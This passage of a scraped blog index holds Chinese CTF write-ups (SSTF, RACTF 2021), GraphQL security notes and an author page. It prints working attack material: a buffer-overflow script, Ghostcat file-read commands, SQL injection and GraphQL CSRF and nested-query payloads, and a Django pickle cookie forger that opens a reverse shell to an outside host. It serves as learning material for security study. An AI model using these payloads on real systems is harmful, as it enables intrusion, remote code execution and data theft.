file:///D:/CyberChef_v9.30.0/CyberChef_v9.30.0.html#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)\u0026amp;input=UzAxWlJFTlhVMU5KVmtoR1VWWktVa3BhUmtaTk1sTkxTVFZLVkVOV1UweExWbFpZUVZsTFZFbGFUa1ZWVmxSTlMwcElSa2MyVTFkS1ZrcEhWMDFMV0V0YVExVlZWRU5YVGxKT1JsTlZTMWRPVWtkR1MwMUVWVXMxUzBkWFZsTkxTMXBEV0ZGVVExUk9VbGxGVDFWVVRFMVNURlpEVFV4RlNrNU1SMWMwUTBsTFdWbEVRMVJEV0V0V01rWk5WakpXVGtKS1JrMVNTMDlNUWt0SFYwNUVXa3RLVjBVMFZsTk9UbEpUUlZkV1ZFdExTa3hXUjAxQ1VrbE9URWRYTlVOUVMwNVhSa1ZTUTFkTFdraEZTVlZhVWs5Q1RVWkZNakpYUzFaS1ZFTlhVMHRMV2xaV1ZWSlRWVWRHVEVaTFZrTkdSMFpJVlRSU1UxWlFSa2RYV1ZSVFRVdE9WbFJMVkV0VFIwWlNWRUZWU2xGTlVrZEdTVlpVVFVzMVNrWk5WRXhhUzFwV1dFbFdNazVPVGt4Rk5GWlVTMHBLVEZaSlVreFJTbFpLUjFkTlMxUkxUVmxFVTFSRFZrNU9Na1ZSVmpKWFNscExSazFXVEZWS1RrcFVRMVZUUlV0YVYwVTBWakpUUjBKT1JrbFZVMWROVWt4R1RWSk1WVXBTU2xkWE5rTllTMGxaVmxWU1ExUkhRVmxWVDFaRFJrMVNUVVUwVmt0UFMwWktWRU5UVTBWTFdsZEdUVlpMVWtkR1UwVTJWa3hNVFZKTlZrdE5TMWROUmt0WFYwOUxSRXRGV1VaVlZVTldUazR5UlZGVldsSlBRa2RHVFZKTFQwczFTMVJCTTBOTlMwcFdXRkZUUTFoTFdsTkZTVlpNVEUxU1JGWkpNakl5U2xKTVIxZFVVMGhMU1ZsV1ZWTXlWMDVPVTBaSFZUTXlTa3BHUmtzeU0wVkxWa2xXVFZWVFZVdFNTMWhKVkRKWFIwSk9SazFXVERKS1NrMUdSVTFETWt0T1RFVkxVbE5YUzA1WFJVMVZRMUpPVGxORlQxWkVNa3BHTlVaUFZreE1SMFpLVkVGWFUwOUxXVmxWTkZKVFZFZEdXVVZKVmxKUlRsSktSVEl5V2xaS05VdEhWMDVMUjB0V1RFWlZWa05YVGswMFZVZFZNMHhNU2taR1N6SXpXVXRLU2xkWFUxTk1TMGxaVjBkTlMxSkhSa3BGV1ZaTVRFcGFUVlpMVmxOUFNsSkxWRUUxUTFOTE5VdFdSVlpEVjB0V1NFWk5WVkpSU1ZWWlJrMHlNa2RMV2twWFZWWlRTa3RhUzBSQlQwdFJTMUZaUkZOVlExSklWVFpSUFQwOVBRPT0K 全部是b64加密 很简单了\nGrabCON{dayuum_s0n!}\n 好菜好菜，开学了 奥里给\n","date":"2021-09-07T11:22:14+08:00","permalink":"https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/","section":"posts","tags":["wp"],"title":"GrabCONCTF2021 Wp"},{"categories":["CTF"],"contents":"https://research.samsung.com/sstf\nhttps://playground.sstf.site/challenges\nTutorial/Practice: Flag Submission SCTF{It_15_tim3_t0_hack!!}\nTutorial/BOF 101 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261\u0026amp;authkey=%21AO4uYzudT40Rn_Y\u0026amp;em=2\nSCTF{n0w_U_R_B0F_3xpEr7}\nTutorial/BOF 102 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251\u0026amp;authkey=%21AMhDJ94NiXLWqYs\u0026amp;em=2\nfrom telnetlib import Telnet tn = Telnet(\u0026#34;bof102.sstf.site\u0026#34;, 1337) tn.read_until(b\u0026#34;Name \u0026gt; \u0026#34;) tn.write(b\u0026#34;/bin/sh\u0026#34; + b\u0026#34;\\n\u0026#34;) payload = b\u0026#39;A\u0026#39;*20 payload += b\u0026#39;\\xe0\\x83\\x04\\x08\u0026#39; payload += b\u0026#39;C\u0026#39;*4 payload += b\u0026#39;\\x34\\xa0\\x04\\x08\u0026#39; tn.read_until(b\u0026#34; \u0026gt; \u0026#34;) tn.write(payload + b\u0026#39;\\n\u0026#39;) tn.interact() SCTF{B0F_A774ck_w1Th_arg5_1n_x86}\nTutorial/SQLi 101 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257\u0026amp;authkey=%21ALtIE_cNe-XDn2o\u0026amp;em=2\nSCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}\nTutorial/SQLi102 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260\u0026amp;authkey=%21AGPulJniPCbx8v4\u0026amp;em=2\n\u0026lt;?php include \u0026#34;./config.php\u0026#34;; $succ = -1; if($_GET[\u0026#39;showsrc\u0026#39;]) { show_source(\u0026#34;step1.php\u0026#34;); die; } if($_GET[\u0026#39;searchkey\u0026#39;]) { $succ = 0; $query = \u0026#34;select * from books where title like \u0026#39;%\u0026#34;.$_GET[\u0026#39;searchkey\u0026#39;].\u0026#34;%\u0026#39;\u0026#34;; $db = dbconnect(\u0026#34;sqli102_step3\u0026#34;); $result = mysqli_query($db,$query); mysqli_close($db); if($result) { $rows = mysqli_num_rows($result); } } ?\u0026gt;SCTF{b451c_SQLi_5k1lls}\nTutorial/RC four https://www.geeksforgeeks.org/rc4-encryption-algorithm/\nhttps://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253\u0026amp;authkey=%21AOekQp-wZMxDdfA\u0026amp;em=2\nTutorial/RSA 101 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256\u0026amp;authkey=%21ANLCkvPBdXSb8Ko\u0026amp;em=2\nWeb/SW Expert Academy  Are you poor at algorithm coding? Here is amazing platform to enhance your coding skill!\n 好家伙，梦回学c语言的时候，看到这个骰子的概率又能梦回高三数学的概率部分\n但是捏，它并不需要你具体写出来code，标答已经给出（虽然我憨憨的一开始没发现自己还写了一份）\nint a[12];for(int i=0;i\u0026lt;12;i++)scanf(\u0026#34;%d\u0026#34;,a+i);int ans=0;int mod=36;for(int i=0;i\u0026lt;6;i++)for(int j=6;j\u0026lt;12;j++)if(a[i]\u0026gt;a[j])ans++;for(int i=2;i\u0026lt;36;i++)while(ans\u0026gt;=i\u0026amp;\u0026amp;ans%i==0\u0026amp;\u0026amp;mod%i==0)ans/=i,mod/=i;printf(\u0026#34;%d/%d\u0026#34;,ans,mod); 当然直接访问/flag.txt又是不可以的\n问题就转化为了如何在输出为符合样例要求的标准输出的情况下还能打印一份地址已知的flag.txt出来\n由于gcc既能编译c也可以编译c++，这里用import来绕过对include的限制；而对于#的绕过可以参见-\u0026gt;Digraphs and trigraphs\n??=import \u0026#34;/flag.txt\u0026#34; %:import \u0026#34;/flag.txt\u0026#34; 相当于#import \u0026ldquo;/flag.txt\u0026rdquo;，从gcc编译时的报错信息可以得到flag\n或者用反斜杠+换行的形式\n??=incl\\ ude \u0026#34;/flag.txt\u0026#34; 也可以绕过对include的过滤\nSCTF{take-care-when-execute-unknown-code}\n————类似的题之前做过一个[FireshellCTF2020]Caas，也是预处理遍历报错出flag\n————在看了别的师傅的wp之后看到了另一种解法，从未设想过的道路\nWeb/Poxe Center  how to get legendary poxemon?\n 看了wp，直接sqlmap一把梭\n不过官方的预期解wp更复杂一些：\n先爆目录/docs/\n这个版本下有CVE-2020-1938 - Ghostcat，相关文章参考-\u0026gt;不调试源码重现 Ghostcat 漏洞 (CVE-2020-1938)\n使用公开的poc读一下配置文件，之后将class反编译获得java源文件（官方poc精简了一些内容 不过大差不差）\npython poc.py -p 31811 -f \u0026quot;/WEB-INF/web.xml\u0026quot; 127.0.0.1 python poc.py -p 31811 -f \u0026quot;/WEB-INF/classes/com/samsung/sctf/MainController.class\u0026quot; 127.0.0.1 python poc.py -p 31811 -f \u0026quot;/WEB-INF/classes/com/samsung/sctf/gochaMapper.class\u0026quot; 127.0.0.1 python poc.py -p 31811 -f \u0026quot;/WEB-INF/demo/WEB-INF/classes/mapper/gochaMapper.xml\u0026quot; 127.0.0.1 /WEB-INF/classes/mapper/gochaMapper.xml是这样的\n这里的sortName和sortFlag直接拼接进sql语句中没有过滤，尝试sqli\nsortName=(case%20when%20(select%20true)%20then%20BID%20else%20%270%27%20end)\u0026amp;sortFlag=desc sortName=(case when (select true) then poke_name else '0' end)\u0026amp;sortFlag=asc sortName=(case%20when%20(select%20false)%20then%20BID%20else%20%270%27%20end)\u0026amp;sortFlag=desc sortName=(case when (select false) then poke_name else '0' end)\u0026amp;sortFlag=asc sortName=random())dummy UNION SELECT'A','B','C','D','D','F',now(),'G','H','I' FROM(SELECT 1 sortFlag=NULL sortName=random())dummy UNION SELECT DD.\u0026quot;index\u0026quot;,DD.\u0026quot;name\u0026quot;,DD.first_attribute,DD.second_attribute,'XX','XX',now(),'XX','XX','XX' FROM( SELECT * from poke_info sortFlag=\u0026quot;\u0026quot; {G0tcH4_Gh0sT_c4t_iS_L3G3ND4Ry_P0k3}\nMisc/meLorean  There was a crazy Data Scientist who rectilinearly claimed mathematics can make miracles. He left a note and then disappeared. Help to decode it.\n 给出了一个这样的文件，充满了二维坐标\n一个线性回归的相关问题，需要用到python中的sklearn.linear_model进行数据处理\nimport ast from sklearn.linear_model import LinearRegression r = LinearRegression() flag = [] with open(\u0026#34;dataset.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: for l in f: l = ast.literal_eval(l) X = [[i[0]] for i in l] y = [i[1] for i in l] r.fit(X, y) flag.append(chr(int(round(r.coef_[0])))) print(\u0026#34;\u0026#34;.join(flag)) SCTF{Pr0gre55_In_R3gr3ss}\nADBaby 是在看wp的时候注意到的题，看了个大概流程（其实只是眼熟adb而已 菜鸡 别骂了），所以下面就是大概翻译一下wp，很水\n先连接上adb connect adbaby.sstf.site:6666，发现这是一个魔改过的adb，屏蔽了shell和主要功能，但是可以使用push/pull，属于文件管理类的命令（全部指令参见-\u0026gt;你确定已经掌握了adb的使用？\nadb pull /proc/self/exe adbaby拿到文件用IDA进行分析，可以看到flag的路径在/data/local/tmp/flag处，但直接用adb pull是不可达的，因为对./, ../, data, local, tmp, flag这些字眼进行了过滤\n有一个自定的service名为adb Flag Service，对输入的密码进行检查，md5后开头是0123456的话就可以拿到flag，用脚本跑一下 415349420009\nfrom adb import adb_commands device = adb_commands.AdbCommands() device.ConnectDevice(serial=\u0026#39;adbaby.sstf.site:6666\u0026#39;) conn = device.protocol_handler.Open(device._handle, b\u0026#39;flag:\u0026#39;) def sendafter(*args): print(device.protocol_handler.InteractiveShellCommand(conn, *args).decode()) sendafter() sendafter(\u0026#39;415349420009\u0026#39;) SCTF{Do_Uth1nk_th1s_1s_adb}\n","date":"2021-09-05T11:09:54+08:00","permalink":"https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/","section":"posts","tags":["wp"],"title":"SSCTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"GraphQL简述 GraphQL是一种针对Graph（图状数据）查询很有优势的Query Language（查询语言），而涉及到存储时可以选择NoSQL, SQL或其它任意存储方式（例如文本文件、存内存里等）；这是一门便于前后端交互的语言，而不是便于后端和数据库交互的语言。\n应用GraphQL的一个很重要的前提是后端数据已经以图的结构进行保存，（并且一定情况下已经设置好基于隐私的访问控制 授权与鉴权，否则会直接被攻击者执行高危操作）。每次查询或更新都有自己的根节点，得到的数据是树状结构；如果希望以图的形式展示则前端不能简单的对其进行缓存，那必须使用相应的存储数据库，通过顶点的ID把不同节点之间的某些边重新连接起来。\n并不是所有场景都需要迁移到GraphQL，如果RESTful API已经能满足需求的话。\n GraphQL is basically just sugar for a simply typed lambda calculus.\n 变更 - Mutations  three important things:\nmutations are just queries in different namespace, but do NOT mix them;\narguments require Input Objects, not normal Objects;\nuse xyzAttributes for anything you want to link, then let your backend sort out how to do the linking(just like any other system we currently use)\n 内省 - introspection GraphQL 允许在查询的任何位置请求 __typename，一个元字段(Meta fields)，以获得那个位置的对象类型名称。\n我们也可以通过查询 __schema 字段来向 GraphQL 询问哪些类型是可用的，类型有以下这些：\n Query, Character, Human, Episode, Droid - 这些是我们在类型系统中定义的类型。 String, Boolean - 这些是内建的标量，由类型系统提供。 __Schema, __Type, __TypeKind, __Field, __InputValue, __EnumValue, __Directive - 这些有着两个下划线的类型是内省系统的一部分。  敏感信息泄露\u0026amp;越权 自动文档生成/解析 - graphdoc | graphql-playground | graphql-voyager \u0026hellip;\u0026hellip;\n由于对对象或属性的权限控制不完善，导致信息泄露，案例：hackerone 一系列信息泄露漏洞\n在objects.types中寻找敏感信息，如email, password, secretkey, token, licensekey, session等，多多关注废弃字段（deprecated fields)。当字段被废弃后直接用__type做内省确实查找不到，但当指定includeDreprecated: true时，__type仍然可以将废弃字段暴露出来。\nGraphQL的认证方式 GraphQL并没有规定任何身份认证和权限控制的相关内容，因此我们可以更灵活的在应用中实现各种粒度的认证和权限；但是也很容易写出一些“裸奔”的接口或无效认证无效的接口。\n独立认证终端 (RESTful) 通用且官方推荐的方式，如果后端本身支持RESTful或有专门的认证服务器，可以修改少量代码实现GraphQL接口的认证。\n举例：添加jwt认证\n在GraphQL内认证 如果GraphQL的后端支持GraphQL不能支持RESTful，或全部请求都需要使用GraphQL，也可以用构造相关的Query Schema接口返回token的形式。\n举例：构造login的Query Schema，在返回值中携带token\ntype Query{ login( username: String! password: String! ): LoginMsg type LoginMsg{ message: String token: String } } 在resolver中提供登录逻辑\nimport bcrypt from 'bcrptjs'; import jsonwebtoken from 'jsonwebtoken'; export const login = async(_, args, context) =\u0026gt; { const db = await context.getDb(); const{username, password} = args; const user = await db.collection('User').findOne({username: username}); if(await bcyrpt.compare(password, user.password)){ return{ message: 'Login success', token: jsonwebtoken.sign({ user: user, exp: Math.floor(Date.now() / 1000) + (60 * 60), }, 'your secret'), }; } } 登录成功后 我们把token设置在请求头中，继续请求GraphQL的其他接口，这时需要对ApolloServer进行如下配置\nconst server = new ApolloServer({ typeDefs: schemaText, resolvers: resolverMap, context: ({ ctx }) =\u0026gt; { const token = ctx.req.headers.authorization || ''; const user = getUser(token); return{ ...user, ...ctx, ...app.context }; }, }); 实现getUser函数\nconst getUser = (token) =\u0026gt; { let user = null; const parts = token.split(' '); if(parts.length === 2){ const scheme = parts[0]; const credentials = parts[1]; if(/^Bearer$/i.test(scheme)){ token = credentials; try{ user = jwt.verify(token, JWT_SECRET); console.log(user); }catch(e){ console.log(e); } } } return user } 配置好ApolloServer后，在resolver中校验user\nimport {ApolloError, ForbiddenError, AuthenticationError} from 'apollo-server'; export const blogs = async(_, args, context) =\u0026gt; { const db = await context.getDb(); const user = context.user; if(!user){ throw new AuthenticationError('You must be logged in to see blogs'); } const {blogId} = args; const cursor = {}； if(blogId){ cursor['_id'] = blogId; } const blogs = await db .collection('blogs') .find(cursor) .sort({publishedAt: -1}) .toArray(); return blogs; } 更多安全漏洞 Express-GraphQL：\n 框架默认无防护 自带GraphiQL  Graphene-Django：\n 依赖Django的安全配置（Secure As Default） 自带GraphiQL  GraphQL-PHP\n 无关框架  Express-GraphQL Endpoint CSRF漏洞 {\u0026quot;query\u0026quot;:\u0026quot;mutation {\\n editProfile(name:\\\u0026quot;hacker\\\u0026quot;, age: 5) {\\n name\\n age\\n }\\n}\u0026quot;,\u0026quot;variables\u0026quot;:null} 将Content-Type修改为application/x-www-form-urlencode，仍可成功执行\nquery=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20 5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D 直接配合burp自带的Generate CSRD POC\nGraphiQL Clickjacking 漏洞 参见：https://github.com/graphql/graphiql/issues/683\n可以配合burp自带的Clickbandit进行攻击\nGraphQL injection 漏洞 这是一个相当全的payloads\u0026amp;exps | 这是一个自省payload\np神ppt里的示意图直接搬过来了\n仍然是拼接了恶意的GraphQL语句导致漏洞的发生，本质还是对用户输入的控制不严格；同类的漏洞还有xss, rce等等\n 有语法就有解析，有解析就会有结构和顺序，有结构和顺序就会有注入。\n 用“参数化查询”的方式来解决上述问题时，要确保后端的解析引擎没有大病\n通过Custom Scalar的注入 (JSON)  NoSQL Injection is entirely possible when using GraphQL, and can creep into your application through the use of \u0026lsquo;custom scalar types\u0026rsquo;\n ————更多的GraphQLi相关问题可参见这个git仓库，一本满足（\n拒绝服务 GraphQL中的query和mutation的返回结果都是可以有嵌套的对象的，如果不对嵌套深度进行限制，有可能被利用从而进行拒绝服务攻击。\n一个举例：\n定义了Blog和Author:\ntype Blog{ _id: String! type: BlogType avatar: String title: String content: [String] author: Author .... } type Author{ _id: String! name: String blog: [Blog] } 都有各自的Query:\nextend type Query{ blogs( blogId: ID systemType: String! ): [Blog] } extend type Query{ author( _id: String ): Author } 我们可以构造这样的查询，无限套娃导致dos\nquery GetBlogs($blogId: ID, $systemType: String!) { blogs(blogId: $blogId, systemType: $systemType) { _id title type content author { name blog { author { name blog { author { name blog { author { name blog { author { name blog { author { name blog { author { name blog { author { name # and so on... } } } } } } } } } } } } } title createdAt publishedAt } } publishedAt } } 解决这个问题我们需要在GraphQL服务器上限制查询深度，同时设计GraphQL接口时尽量避免出现此类问题，以Node.js为例，graphql-depth-limit就可以解决这样的问题\n// ... import depthLimit from 'graphql-depth-limit'; // ... const server = new ApolloServer({ typeDefs: schemaText, resolvers: resolverMap, context: ({ ctx }) =\u0026gt; { const token = ctx.req.headers.authorization || ''; const user = getUser(token); console.log('user', user) return{ ...user, ...ctx, ...app.context }; }, validationRules: [ depthLimit(10) ] }); // ... Graphene-Django DEBUG模式下的安全问题 在CTF中的表现 [HITB CTF Singapore 2017]Blog\n[SECT 2017]Dark Market | wp2\n[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3 | wp2\n[VolgaCTF 2020]Library\n[corCTF 2021]devme\n结尾 Damn Vulnerable GraphQL Application-\u0026gt; 一个漏洞复现的靶场，包含了上面提到和没提到的GraphQL存在的洞\ndocker pull dolevf/dvga docker run -d -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga 已经有写好的wp了 不向互联网产出湿垃圾 从我做起\n   以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（   中文官网\n在线GraphiQL\nlearn-graphql\n什么是 GraphQL？\n玩转graphQL\nGraphQL 从入门到实践\n【CuteJavaScript】GraphQL真香入门教程\n攻击GraphQL\nGraphQL安全指北\nUWP GraphQL数据查询的实现\nGraphQL Mutations\nGraphQL NoSQL Injection Through JSON Types\nGraphQL Injection\n【安全记录】玩转GraphQL - DVGA靶场（上）\n【安全记录】玩转GraphQL - DVGA靶场（下）\n[HITB CTF Singapore 2017]Blog\n[SECT 2017]Dark Market | wp2\n[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3 | wp2\n[VolgaCTF 2020]Library\n  开学了，不摆烂从我做起\n","date":"2021-09-03T20:56:54+08:00","permalink":"https://amiaaaz.github.io/2021/09/03/graphql-study-notes/","section":"posts","tags":["GraphQL"],"title":"GraphQL学习笔记"},{"categories":[],"contents":"你好呀ﾟ∀ﾟ)ノ\n这里是葵子，一个信安专业的普通大二学生\n超高校级网上冲浪爱好者，喜欢看书，听歌和思考人生，喜欢打音游和一些单机游戏，运动细胞为0\nctf web方向的看题选手（别问为什么只是看题 问就是签到题都不会），不过人菜瘾大，日常瞎琢磨，瞎研究；兴趣驱动型，有一颗想成为全栈的心（梦想还是要有的，日拱一卒，说不定就实现了\n在努力让自己看起来不那么菜，进度0/n（已经脱离负数了！好消息）\n致力于点出一棵茂盛、浓密的技能树。既然“以有涯随无涯”会die();，那就设好断点，在调试的过程中慢慢debug，说不定就Bypass了呢？\n这个小小的博客会包含一些粗糙但质朴的笔记和精致且同样用心的wp，还会有一些信手写就的文字，于21年7月底开张。\n虽然现在只有一些含水量很高、技术力很低的互联网干垃圾，但未来这里一定会有自己的原创产出；虽然现在小站门可罗雀，但希望有一天可以为更多的人带来帮助；希望在学安全的道路上一直走下去\nstay hungry, stay foolish.\n  I wanna be defined by the things that I love\nNot the things I hate\nNot the things I\u0026rsquo;m afraid of, I\u0026rsquo;m afraid of\nOr the things that haunt me in the middle of the night\nI, I just think that\nYou are what you love\n ","date":"2021-08-25T01:39:57+08:00","permalink":"https://amiaaaz.github.io/about/","section":"","tags":[],"title":"About"},{"categories":["CTF"],"contents":"https://2021.ractf.co.uk/\nhttps://github.com/ractf/challenges/tree/master/2021\nhttps://github.com/404dcd/RACTF-challenges\nhttps://blog.ractf.co.uk/tag/ractf-2021/\nWeb/Really Awesome Monitoring Dashboard  🌟 Perfect infrastructure 🌟\n 是grafana\n但是版本也太新了吧8.1.1，弱口令也没有，抓包可以看到它在不停的请求各种api，其中有个/api/ds/query，以明文方式请求数据库内容\n那这就好说了，直接明牌了都\nSELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%'; SELECT * FROM flags; ————这个故事告诉我们对于权限的设置是很重要的，不要随便把api接口暴露出来，也不要明文传递信息\nWeb/Really Awesome Hidden Service  Ahoy, matey! Some dirty scallywags seem to not be respectin' th' pirate code! Teach them a lesson by findin' out who they be.\nractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion  一个Tor的网站，走匿名方式\n那首先要把隐藏在后面的真实ip给找出来。整个网页的内容没有什么特别的，但是通常容易被忽略的是favicon图像，这里可以参考这样一篇文章：Hunting phishing websites with favicon hashes\n这里可以用fav-up一把梭（也就是自动化了提取图标-\u0026gt;计算mmhash值-\u0026gt;shodan搜索出ip这个过程），得到ip为178.62.4.214|178.62.15.164\nractf{DreadingPirates}\n————除此之外还有一个非预期解，当用非法的host header请求时，会直接返回flag\n$ curl -s --socks5-hostname localhost:9050 -H \u0026#34;Host: asd.com\u0026#34; ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion | grep \u0026#34;ractf\u0026#34; All you need to do is send the server an invalid host header, which will cause it to fail back to its default vhost which reveals the flag. In retrospect, the solution to this would have been to make the flag only visible on a specific vhost, rather than the default.\nWeb/Emojibook  The flag is at /flag.txt\n 可以登录、注册账户、发布note、查看，给出了源码\n看源码，是django框架的后端，直奔settings.py\n看到了熟悉的pickle\n在仅有的这个app的view.py中有这样的代码，会在note的body部分匹配{{.*?}}这样的内容并将其中的部分拼接到/emoji/后以image的形式加载出来，但是直接用{{/flag.txt}}是不可以的，这部分代码在forms.py中\n所以最终的payload是 {..{/flag.txt}..}\nractf{dj4ng0_lfi}\n————然而这里有个非预期，url部分可以直接修改note编号达到水平越权，也就是说可以通过爆破方式找到之前已经成功的note\nimport logging import threading import time import requests def thread_function(name): try: r=requests.get(\u0026#34;http://193.57.159.27:30160/\u0026#34;+str(name)) if (\u0026#34;base64\u0026#34; in r.text and \u0026#34;cmFjdGZ7\u0026#34; in r.text): print(r.text) except: pass if __name__ == \u0026#34;__main__\u0026#34;: threads = list() for index in range(1000): x = threading.Thread(target=thread_function, args=(index,)) threads.append(x) x.start() for index, thread in enumerate(threads): thread.join() Web/Emojybook 2  no unintended solution this time! the source has not been patched, the unintended solution was caused by my dockerfile\nThe flag is at /flag.txt\n 跟上面那个前端一模一样，然而这次再用之前的 {..{/flag.txt}..}会返回500错误，这回就要用上之前完全没用到的pickle session cookie了。\n先读一下/app/notebook/settings.py，得到secret_key，然后搞一个反弹shell的cookie出来\n# Modified from https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/ #!/usr/bin/python import django.core.signing, django.contrib.sessions.serializers from django.http import HttpResponse from django.conf import settings import pickle import os import requests SECRET_KEY = \u0026#39;wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7\u0026#34;(S3xv,{sp)Xaqg?2pj2=hFCgN\u0026#34;CR\u0026#34;UPn4\u0026#39; settings.configure(DEFAULT_HASHING_ALGORITHM=\u0026#34;sha256\u0026#34;) # Initial cookie when visiting the page cookie=\u0026#34;.eJxNjEEKwjAQRUVwKYKn0E1Impmm3Yl7z1AmSWNbJYW2WQoeIMt4D4-ookL_8r3Hv68ez8V3t7SL64rC1FRhrIeqtSkuS0xxO4OazKX2b7O3Hflzz0zvp6HV7JOwnx3Zqbf19fhvN7ODhsYmxQOQyMjmSIpzLjMCYyRpDTlwI5wAaTNwFhWgwVISaVWgUKiVcM4V4FJgLxnJP1s:1mFhOG:5yO4Fkp6kQCGyt6e5jHf6Gn5V6gqPDWIw21OTFSw8DM\u0026#34; newContent = django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=\u0026#39;django.contrib.sessions.backends.signed_cookies\u0026#39;) class PickleRce(object): def __reduce__(self): import os return (os.system,(\u0026#34;python -c \u0026#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;VPS IP\\\u0026#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\u0026#34;/bin/sh\\\u0026#34;)\u0026#39;\u0026#34;,)) newContent[\u0026#39;testcookie\u0026#39;] = PickleRce() new_cookie = django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=\u0026#39;django.contrib.sessions.backends.signed_cookies\u0026#39;,compress=True) # We can then make a request with this cookie requests.get(\u0026#34;http://193.57.159.27:23934/\u0026#34;, cookies={ \u0026#34;sessionid\u0026#34;: new_cookie }) 得到shell之后我们只是个web用户，读/etc/shadow可以i得到admin的hash值，弱口令 是个999999，然后我们就可以su admin，读flag了\nractf{dj4ng0_lfi_rce_not_unintended}\n参考：wp\nWeb/Military Grade  Go is safe, right? That means my implementation of AES will be secure?\n 给出了go文件\npackage main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;time\u0026#34; ) const rawFlag = \u0026#34;[REDACTED]\u0026#34; var flag string var flagmu sync.Mutex func PKCS5Padding(ciphertext []byte, blockSize int, after int) []byte { padding := (blockSize - len(ciphertext)%blockSize) padtext := bytes.Repeat([]byte{byte(padding)}, padding) return append(ciphertext, padtext...) } func encrypt(plaintext string, bKey []byte, bIV []byte, blockSize int) string { bPlaintext := PKCS5Padding([]byte(plaintext), blockSize, len(plaintext)) block, err := aes.NewCipher(bKey) if err != nil { log.Println(err) return \u0026#34;\u0026#34; } ciphertext := make([]byte, len(bPlaintext)) mode := cipher.NewCBCEncrypter(block, bIV) mode.CryptBlocks(ciphertext, bPlaintext) return hex.EncodeToString(ciphertext) } func changer() { ticker := time.NewTicker(time.Millisecond * 672).C for range ticker { rand.Seed(time.Now().UnixNano() \u0026amp; ^0x7FFFFFFFFEFFF000) for i := 0; i \u0026lt; rand.Intn(32); i++ { rand.Seed(rand.Int63()) } var key []byte var iv []byte for i := 0; i \u0026lt; 32; i++ { key = append(key, byte(rand.Intn(255))) } for i := 0; i \u0026lt; aes.BlockSize; i++ { iv = append(iv, byte(rand.Intn(255))) } flagmu.Lock() flag = encrypt(rawFlag, key, iv, aes.BlockSize) flagmu.Unlock() } } func handler(w http.ResponseWriter, req *http.Request) { flagmu.Lock() fmt.Fprint(w, flag) flagmu.Unlock() } func main() { log.Println(\u0026#34;Challenge starting up\u0026#34;) http.HandleFunc(\u0026#34;/\u0026#34;, handler) go changer() log.Fatal(http.ListenAndServe(\u0026#34;:80\u0026#34;, nil)) } 可以看到flag被AES CBC加密，加密本身没问题，问题出在种子上；种子生成是靠rand.Seed(time.Now().UnixNano() \u0026amp; ^0x7FFFFFFFFEFFF000)完成，这样得到的种子很小 可以被我们爆破出来\nexp.go\npackage main import( \u0026#34;math/rand\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; ) func main() { hextext := \u0026#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914\u0026#34; // Encrypted Flag \tfor seed:=1; seed\u0026lt;=19777868; seed++ { rand.Seed(int64(seed)) for i := 0; i \u0026lt; rand.Intn(32); i++ { rand.Seed(rand.Int63()) } var key []byte var iv []byte for i := 0; i \u0026lt; 32; i++ { key = append(key, byte(rand.Intn(255))) } for i := 0; i \u0026lt; aes.BlockSize; i++ { iv = append(iv, byte(rand.Intn(255))) } block, _ := aes.NewCipher(key) mode := cipher.NewCBCDecrypter(block, iv) ciphertext, _ := hex.DecodeString(hextext) flagBytes := make([]byte, len(ciphertext)) mode.CryptBlocks(flagBytes, ciphertext) flag := string(flagBytes) if strings.Contains(flag, \u0026#34;ractf\u0026#34;) { fmt.Printf(\u0026#34;Flag: %s\\n\u0026#34;, flag) break } } } ractf{int3rEst1ng_M4sk_paTt3rn}\n参考：wp\nWeb/Secret Store  How many secrets could a secret store store if a store could store secrets?\n 注册和登录之后可以通过api设置一个自己的secret，设置好之后还可以更改\n给出了源码，是django框架，用到了rest_framework，页面的debug模式还开着，有一个名为secret的app\nmodels.py规定了数据库的存储\n还有个配套的model 